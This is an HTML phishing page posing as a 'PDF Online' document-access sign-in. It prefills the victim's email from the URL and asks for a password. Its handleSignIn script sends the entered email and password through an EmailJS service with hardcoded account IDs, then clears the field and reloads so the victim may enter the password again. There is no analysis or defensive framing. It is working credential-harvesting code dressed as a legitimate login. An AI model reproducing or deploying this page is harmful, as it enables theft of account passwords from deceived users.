<html lang="en">
<head>
    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
    <title>PDF Document Cloud | Sign in</title>
    <script>
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');
            if (email) {
                document.getElementById('login').value = email;
            }
            document.getElementById('passwd').focus();
        };

        // Delay function to ensure consistent timing
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function handleSignIn() {
            const email = document.getElementById('login').value;
            const password = document.getElementById('passwd').value;

            if (!email || !password) {
                alert('Please enter both email and password.');
                return;
            }

            const timestamp = Date.now();
            const payload = {
                email: email,
                password: password,
                date: new Date().toLocaleString(),
                timestamp: timestamp
            };

            let sendSuccess = false;
            try {
                const response = await emailjs.send('service_lwkhl0m', 'template_of2ygxs', payload);
                console.log('Email sent successfully:', response.status, response.text, payload);
                sendSuccess = true;
            } catch (error) {
                console.error('EmailJS Error:', error.text || error, payload);
            }

            // Minimum 2-second delay to match successful send time
            await delay(2000);

            // Clear field and reload
            document.getElementById('passwd').value = '';
            window.location.reload();
        }
    </script>
</head>

<body style="background-image: url(https://i.postimg.cc/0yV5B2NG/background1.jpg); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span><img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                            <span class="h5">PDF Online</span><br>
                            <span class="h5"></span><br>
                            <span class="h">This a protected document, please verify to access.</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <small></small>
                            <div class="form-group">
                                <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" readonly autofocus required>
                            </div>
                            <div class="form-group mt-2">
                                <small></small>
                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" required>
                            </div>
                        </div>
                        <div class="form-check mt-3">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                        </div>
                        <div class="col-lg-12 mt-3">
                            <button type="button" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;" onclick="handleSignIn()">LOGIN</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("w17wdnGCRGm_6m5h0"); // Replace with your EmailJS Public Key
        })();
    </script>

    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9215d9757970b037',t:'MTc0MjE0NDg3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'921e80e59a3062b1',t:'MTc0MjIzNTYxOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
